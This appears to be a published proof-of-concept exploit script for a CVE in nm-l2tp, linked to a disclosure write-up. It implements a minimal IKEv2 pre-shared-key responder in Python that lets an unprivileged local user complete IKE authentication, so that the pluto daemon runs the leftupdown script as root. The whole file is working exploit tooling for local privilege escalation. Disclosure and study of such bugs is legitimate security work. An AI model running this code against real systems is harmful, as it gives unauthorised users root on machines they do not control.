#!/usr/bin/env python3
#
# LinnemanLabs - nm-l2tp PoC - minimal IKEv2 PSK responder
# https://linnemanlabs.com/posts/nm-l2tp-newline-to-root
#
# CVE-2026-19624
#
# Sets up a minimal IKE responder to establish connection to fire the leftupdown
# script. Allows unprivileged user to setup a listener that will satisfy the exploit.
#
# Everything after authentication is dropped: no child-SA negotiation, no TSi/TSr, etc.
# Only the three responder-side keys (SK_er, SK_ar, SK_pr) are derived.
#
# Usage: python3 nm-l2tp-poc-responder [bind_ip] [port] [psk] [rightid]
#
import socket, struct, os, hashlib, hmac, sys
try:
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    def aes_cbc(key, iv, data, encrypt=True):
        op = (Cipher(algorithms.AES(key), modes.CBC(iv)).encryptor() if encrypt
              else Cipher(algorithms.AES(key), modes.CBC(iv)).decryptor())
        return op.update(data) + op.finalize()
except ImportError:
    import subprocess
    def aes_cbc(key, iv, data, encrypt=True):
        cmd = ["openssl","enc","-aes-128-cbc","-nopad","-K",key.hex(),"-iv",iv.hex()] + ([] if encrypt else ["-d"])
        r = subprocess.run(cmd, input=data, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        if r.returncode: raise RuntimeError("openssl: " + r.stderr.decode()[:200])
        return r.stdout

BIND = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.2"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 5500
PSK  = (sys.argv[3] if len(sys.argv) > 3 else "linnemanlabs-poc").encode()
# rightid=@R -> ID_FQDN "R"
IDR  = (sys.argv[4] if len(sys.argv) > 4 else "R").encode()

# who doesnt like a good scary looking blob in their exploit?
# DH 14
P = int("FFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74"
"020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374"
"FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE"
"386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598D"
"A48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED5"
"29077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E7"
"72C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497"
"CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF", 16)
G = 2
def prf(k, m): return hmac.new(k, m, hashlib.sha256).digest()
def prfplus(k, s, n):
    t = b""; out = b""; i = 1
    while len(out) < n: t = prf(k, t + s + bytes([i])); out += t; i += 1
    return out[:n]
def pl(nxt, body): return bytes([nxt, 0]) + struct.pack(">H", 4 + len(body)) + body

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.bind((BIND, PORT)); s.settimeout(30)
print(f"[*] ikev2 responder on {BIND}:{PORT} (psk={PSK.decode()} idr=@{IDR.decode()})"); sys.stdout.flush()

# IKE_SA_INIT: read the initiator's g^i and Ni
d, addr = s.recvfrom(8192)
# strip NAT-T non-ESP marker if present
mk = d[:4] == b"\x00\x00\x00\x00"; raw = d[4:] if mk else d
spii = raw[0:8]
nxt = raw[16]; off = 28; gi = None; Ni = None
while nxt != 0:
    ln = struct.unpack(">H", raw[off+2:off+4])[0]
    # KE (skip 2B group + 2B resv)
    if   nxt == 34: gi = int.from_bytes(raw[off+8:off+ln], "big")
    # Nonce
    elif nxt == 40: Ni = raw[off+4:off+ln]
    nxt = raw[off]; off += ln
#print(f"[*] IKE_SA_INIT from {addr}"); sys.stdout.flush()
print(f"[*] received IKE_SA_INIT from {addr}"); sys.stdout.flush()

# derive keys + answer IKE_SA_INIT
priv = int.from_bytes(os.urandom(32), "big")
gr = pow(G, priv, P).to_bytes(256, "big")
shared = pow(gi, priv, P).to_bytes(256, "big")
Nr = os.urandom(32); spir = os.urandom(8)
km = prfplus(prf(Ni + Nr, shared), Ni + Nr + spii + spir, 192)
# responder integ / encr / auth keys
SK_ar, SK_er, SK_pr = km[64:96], km[112:128], km[160:192]

# one SA transform
def tf(last, tt, tid, attr=b""):
    return bytes([0 if last else 3, 0]) + struct.pack(">H", 8+len(attr)) + bytes([tt]) + b"\x00" + struct.pack(">H", tid) + attr
# AES128 / SHA256 / SHA256-128 / DH14
trans = tf(0,1,12,struct.pack(">HH",0x800E,128)) + tf(0,2,5) + tf(0,3,12) + tf(1,4,14)
prop = bytes([0,0]) + struct.pack(">H", 8+len(trans)) + bytes([1,1,0,4]) + trans
# SA    -> KE
body  = pl(34, prop)
# KE    -> Nonce
body += pl(40, struct.pack(">H",14) + b"\x00\x00" + gr)
# Nonce -> end
body += pl(0,  Nr)
msg2 = spii + spir + bytes([33,0x20,34,0x20]) + struct.pack(">II",0,28+len(body)) + body
s.sendto((b"\x00\x00\x00\x00" if mk else b"") + msg2, addr)

# IKE_AUTH: authenticate, then reject is all we need to do
# receive it, nothing inside is needed
s.recvfrom(8192)
# ID_FQDN
idr = bytes([2,0,0,0]) + IDR
auth = bytes([2,0,0,0]) + prf(prf(PSK, b"Key Pad for IKEv2"), msg2 + Ni + prf(SK_pr, idr))
# IDr  -> AUTH
inner  = pl(39, idr)
# AUTH -> Notify
inner += pl(41, auth)
# N(NO_PROPOSAL_CHOSEN) -> end
inner += pl(0,  bytes([0,0]) + struct.pack(">H",14))
iv = os.urandom(16); padl = (16 - ((len(inner)+1) % 16)) % 16
skb = iv + aes_cbc(SK_er, iv, inner + b"\x00"*padl + bytes([padl]), True) + b"\x00"*16
m = bytearray(spii + spir + bytes([46,0x20,35,0x20]) + struct.pack(">II",1,28+4+len(skb)) + pl(36, skb))
m[-16:] = hmac.new(SK_ar, bytes(m[:-16]), hashlib.sha256).digest()[:16]
s.sendto((b"\x00\x00\x00\x00" if mk else b"") + bytes(m), addr)
print("[+] authenticated - pluto should run leftupdown as root (verb=unroute-host)"); sys.stdout.flush()
